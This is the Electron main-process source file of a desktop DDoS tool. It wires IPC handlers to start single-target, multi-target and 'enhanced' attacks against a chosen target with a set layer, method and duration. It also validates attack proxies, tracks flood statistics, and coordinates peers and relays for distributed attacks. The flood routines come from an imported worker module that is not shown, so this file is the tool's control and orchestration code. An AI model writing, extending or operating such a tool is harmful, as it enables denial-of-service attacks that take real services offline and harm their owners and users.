// main.js - Enhanced with Multi-Target Attacks & Networking
const { app, BrowserWindow, ipcMain, dialog } = require('electron');
const path = require('path');
const fs = require('fs').promises;

const { 
  startAttack, 
  startMultiTargetAttack, 
  startEnhancedAttack,
  stopAttack,
  stopAllAttacks,
  getActiveAttacks,
  getAttackStats,
  getAttackHistory,
  getGlobalStats,
  getResourceStats,
  validateConfig,
  validateProxies,
  setLogLevel,
  setLogFile,
  onAttackProgress,
  onAttackCompleted,
  onResourceUpdate,
  attackManager,
  logger
} = require('./worker/farmily.js');

const SystemInfoManager = require('./systeminfo/systeminfo.js');
const NetworkCoordinator = require('./networking/coordinator.js');

let mainWindow;
let systemInfoManager;
let networkCoordinator;
let monitoringSession = null;
let attackProgressUnsubscribe = null;
let attackCompletedUnsubscribe = null;
let resourceUpdateUnsubscribe = null;

function createWindow() {
   mainWindow = new BrowserWindow({
     width: 1400,
     height: 900,
     show: false,
     webPreferences: {
       nodeIntegration: false,
       contextIsolation: true,
       preload: path.join(__dirname, 'preload.js')
     }
   });

   mainWindow.loadFile('renderer/loading.html');
   
   mainWindow.once('ready-to-show', () => {
     mainWindow.show();
   });

   systemInfoManager = new SystemInfoManager();
   networkCoordinator = new NetworkCoordinator();

   setupNetworkingEvents();
   setupAttackMonitoring();
   setupLogging();
}
function setupNetworkingEvents() {
    networkCoordinator.on('networking-started', (data) => {
        mainWindow.webContents.send('networking-started', data);
    });

    networkCoordinator.on('peer-discovered', (data) => {
        mainWindow.webContents.send('peer-discovered', data);
    });

    networkCoordinator.on('aggregated-stats-updated', (data) => {
        mainWindow.webContents.send('network-stats-updated', data);
    });

    networkCoordinator.on('relay-connected', (data) => {
        mainWindow.webContents.send('relay-connected', data);
    });
}

function setupAttackMonitoring() {
    attackProgressUnsubscribe = onAttackProgress((data) => {
        mainWindow.webContents.send('attack-progress', data);
    });
    attackCompletedUnsubscribe = onAttackCompleted((data) => {
        mainWindow.webContents.send('attack-completed', data);
    });
    resourceUpdateUnsubscribe = onResourceUpdate((stats) => {
        mainWindow.webContents.send('resource-update', stats);
    });
}
async function setupLogging() {
  const logLevel = process.env.NODE_ENV === 'development' ? 'debug' : 'info';
  const logDir = path.join(__dirname, 'logs');
  await fs.mkdir(logDir, { recursive: true }).catch((err) => console.error('Failed to create logs directory:', err));
  const logPath = path.join(logDir, `mkenya-${new Date().toISOString().split('T')[0]}.log`);
  setLogLevel(logLevel);
  setLogFile(logPath);
  logger.on('log', (logEntry) => {
    mainWindow.webContents.send('log-message', logEntry);
  });
}

app.whenReady().then(() => {
  createWindow();
  ipcMain.handle('start-ddos-attack', async (event, { target, layer, method, duration, options = {} }) => {
    try {
      const networkStatus = await networkCoordinator.startNetworking();
      console.log('Networking status:', networkStatus);
      const preAttackPerformance = await systemInfoManager.getPerformanceMetrics();
      
      const crypto = require('crypto');
      const targetHash = crypto.createHash('sha256').update(target).digest('hex').substring(0, 16);
      
      networkCoordinator.updateLocalStats({
        bandwidth: 0,
        cpuUsage: preAttackPerformance.performance.cpu.usage,
        memoryUsage: preAttackPerformance.performance.memory.usage,
        attackType: `${layer}-${method}`,
        targetHash: targetHash,
        status: 'starting'
      });
      const result = await startAttack(target, layer, method, duration, {
        ...options,
        onProgress: (stats) => {
          networkCoordinator.updateLocalStats({
            bandwidth: stats.currentBandwidth || 0,
            cpuUsage: stats.cpuUsage || preAttackPerformance.performance.cpu.usage,
            memoryUsage: stats.memoryUsage || preAttackPerformance.performance.memory.usage,
            attackType: `${layer}-${method}`,
            targetHash: targetHash,
            status: 'attacking',
            requestsPerSecond: stats.requestsPerSecond || 0,
            successRate: stats.successRate || 0
          });
        }
      });
      
      const postAttackPerformance = await systemInfoManager.getPerformanceMetrics();
      const finalNetworkStats = networkCoordinator.getNetworkStatus();
      networkCoordinator.updateLocalStats({
        bandwidth: result.totalBytesSent || 0,
        cpuUsage: postAttackPerformance.performance.cpu.usage,
        memoryUsage: postAttackPerformance.performance.memory.usage,
        attackType: `${layer}-${method}`,
        targetHash: targetHash,
        status: 'completed',
        requestsPerSecond: result.requestsPerSecond || 0,
        successRate: result.successRate || 0
      });

      return {
        success: true,
        data: {
          ...result,
          systemPerformance: {
            preAttack: preAttackPerformance,
            postAttack: postAttackPerformance
          },
          networkStats: finalNetworkStats
        }
      };
    } catch (error) {
      networkCoordinator.updateLocalStats({
        status: 'failed',
        error: error.message
      });
      
      return {
        success: false,
        error: error.message
      };
    }
  });

  ipcMain.handle('start-multi-target-attack', async (event, config) => {
    try {
      const validation = validateConfig(config);
      if (!validation.valid) {
        throw new Error(`Invalid configuration: ${validation.error}`);
      }

      await networkCoordinator.startNetworking();
      
      const preAttackPerformance = await systemInfoManager.getPerformanceMetrics();
      
      const result = await startMultiTargetAttack({
        ...config,
        onProgress: (data) => {
          const totalBandwidth = data.targets?.reduce((sum, t) => sum + (t.currentBandwidth || 0), 0) || 0;
          const avgSuccessRate = data.targets?.reduce((sum, t) => sum + (t.successRate || 0), 0) / (data.targets?.length || 1) || 0;
          
          networkCoordinator.updateLocalStats({
            bandwidth: totalBandwidth,
            cpuUsage: preAttackPerformance.performance.cpu.usage,
            memoryUsage: preAttackPerformance.performance.memory.usage,
            attackType: `MultiTarget-${config.layer}-${config.method}`,
            targetHash: 'multi-target',
            status: 'attacking',
            requestsPerSecond: data.averageRequestsPerSecond || 0,
            successRate: avgSuccessRate,
            targetCount: config.targets.length
          });
        }
      });

      const postAttackPerformance = await systemInfoManager.getPerformanceMetrics();
      const finalNetworkStats = networkCoordinator.getNetworkStatus();

      return {
        success: true,
        data: {
          ...result,
          systemPerformance: {
            preAttack: preAttackPerformance,
            postAttack: postAttackPerformance
          },
          networkStats: finalNetworkStats
        }
      };
    } catch (error) {
      return {
        success: false,
        error: error.message
      };
    }
  });

  ipcMain.handle('start-enhanced-attack', async (event, config) => {
    try {
      const result = await startEnhancedAttack(config);
      const finalNetworkStats = networkCoordinator.getNetworkStatus();

      return {
        success: true,
        data: {
          ...result,
          networkStats: finalNetworkStats
        }
      };
    } catch (error) {
      return {
        success: false,
        error: error.message
      };
    }
  });

  ipcMain.handle('stop-attack', async (event, attackId) => {
    try {
      await stopAttack(attackId);
      return { success: true, message: `Attack ${attackId} stopped` };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('stop-all-attacks', async () => {
    try {
      await stopAllAttacks();
      return { success: true, message: 'All attacks stopped' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-active-attacks', async () => {
    try {
      const attacks = getActiveAttacks();
      return { success: true, data: attacks };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-attack-stats', async (event, attackId) => {
    try {
      const stats = getAttackStats(attackId);
      return { success: true, data: stats };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-attack-history', async () => {
    try {
      const history = getAttackHistory();
      return { success: true, data: history };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-global-attack-stats', async () => {
    try {
      const stats = getGlobalStats();
      const resourceStats = getResourceStats();
      return { 
        success: true, 
        data: { 
          ...stats, 
          resourceStats 
        } 
      };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('validate-attack-config', async (event, config) => {
    try {
      const validation = validateConfig(config);
      return { success: true, data: validation };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('validate-proxies', async (event, proxyList) => {
    try {
      const validation = await validateProxies(proxyList);
      return { success: true, data: validation };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('start-networking', async () => {
    try {
      const status = await networkCoordinator.startNetworking();
      return { success: true, data: status };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('stop-networking', async () => {
    try {
      await networkCoordinator.stopNetworking();
      return { success: true, message: 'Networking stopped' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-network-stats', async () => {
    try {
      const stats = networkCoordinator.getNetworkStatus();
      return { success: true, data: stats };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('update-attack-stats', async (event, stats) => {
    try {
      networkCoordinator.updateLocalStats(stats);
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-peer-details', async () => {
    try {
      const peers = networkCoordinator.getPeerDetails();
      return { success: true, data: peers };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('test-connectivity', async () => {
    try {
      const tests = await networkCoordinator.testConnectivity();
      return { success: true, data: tests };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('discover-peers', async () => {
    try {
      const peers = await networkCoordinator.discoverPeers();
      return { success: true, data: peers };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-network-optimizations', async () => {
    try {
      const recommendations = networkCoordinator.getNetworkOptimizations();
      return { success: true, data: recommendations };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('export-network-data', async () => {
    try {
      const data = networkCoordinator.exportNetworkData();
      
      const result = await dialog.showSaveDialog(mainWindow, {
        title: 'Export Network Data',
        defaultPath: `network-data-${new Date().toISOString().split('T')[0]}.json`,
        filters: [{ name: 'JSON Files', extensions: ['json'] }]
      });

      if (!result.canceled && result.filePath) {
        await fs.writeFile(result.filePath, JSON.stringify(data, null, 2));
        return { success: true, message: 'Network data exported', filePath: result.filePath };
      }
      
      return { success: false, message: 'Export cancelled' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });
  ipcMain.handle('get-system-info', async () => {
    try {
      const info = await systemInfoManager.getSystemInfo();
      return { success: true, data: info };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-basic-info', async () => {
    try {
      const info = await systemInfoManager.getBasicInfo();
      return { success: true, data: info };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-cpu-info', async () => {
    try {
      const info = await systemInfoManager.getCPUInfo();
      return { success: true, data: info };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-memory-info', async () => {
    try {
      const info = await systemInfoManager.getMemoryInfo();
      return { success: true, data: info };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-disk-info', async () => {
    try {
      const info = await systemInfoManager.getDiskInfo();
      return { success: true, data: info };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-network-info', async () => {
    try {
      const info = await systemInfoManager.getNetworkInfo();
      return { success: true, data: info };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-processes', async () => {
    try {
      const processes = await systemInfoManager.getProcesses();
      return { success: true, data: processes };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-system-logs', async (event, { logType, maxEvents }) => {
    try {
      const logs = await systemInfoManager.getSystemLogs(logType, maxEvents);
      return { success: true, data: logs };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-performance-metrics', async () => {
    try {
      const metrics = await systemInfoManager.getPerformanceMetrics();
      return { success: true, data: metrics };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-platform-info', async () => {
    try {
      const info = await systemInfoManager.getPlatformInfo();
      return { success: true, data: info };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('get-optimization-recommendations', async () => {
    try {
      const recommendations = await systemInfoManager.getOptimizationRecommendations();
      return { success: true, data: recommendations };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('start-monitoring', async (event, { interval }) => {
    try {
      if (monitoringSession) {
        monitoringSession.stop();
      }
      
      monitoringSession = await systemInfoManager.startMonitoring(interval);
      
      monitoringSession.on('data', (data) => {
        mainWindow.webContents.send('monitoring-data', data);
      });
      
      return { success: true, message: 'Monitoring started' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('stop-monitoring', async () => {
    try {
      if (monitoringSession) {
        monitoringSession.stop();
        monitoringSession = null;
      }
      return { success: true, message: 'Monitoring stopped' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('export-system-info', async (event, { format }) => {
    try {
      const data = await systemInfoManager.exportSystemInfo(format);
      
      const result = await dialog.showSaveDialog(mainWindow, {
        title: 'Export System Information',
        defaultPath: `system-info-${new Date().toISOString().split('T')[0]}.${format}`,
        filters: [
          { name: 'JSON Files', extensions: ['json'] },
          { name: 'Text Files', extensions: ['txt'] }
        ]
      });

      if (!result.canceled && result.filePath) {
        await fs.writeFile(result.filePath, data);
        return { success: true, message: 'System info exported', filePath: result.filePath };
      }
      
      return { success: false, message: 'Export cancelled' };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });

  ipcMain.handle('navigate-to-main', async () => {
    try {
      await mainWindow.loadFile('renderer/index.html');
      return { success: true };
    } catch (error) {
      return { success: false, error: error.message };
    }
  });
});

app.on('before-quit', async () => {
  try {
    await stopAllAttacks();
    if (monitoringSession) {
      monitoringSession.stop();
    }
    if (networkCoordinator) {
      await networkCoordinator.cleanup();
    }
    if (attackProgressUnsubscribe) attackProgressUnsubscribe();
    if (attackCompletedUnsubscribe) attackCompletedUnsubscribe();
    if (resourceUpdateUnsubscribe) resourceUpdateUnsubscribe();
    
    console.log('Cleanup completed successfully');
  } catch (error) {
    console.error('Error during cleanup:', error.message);
  }
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});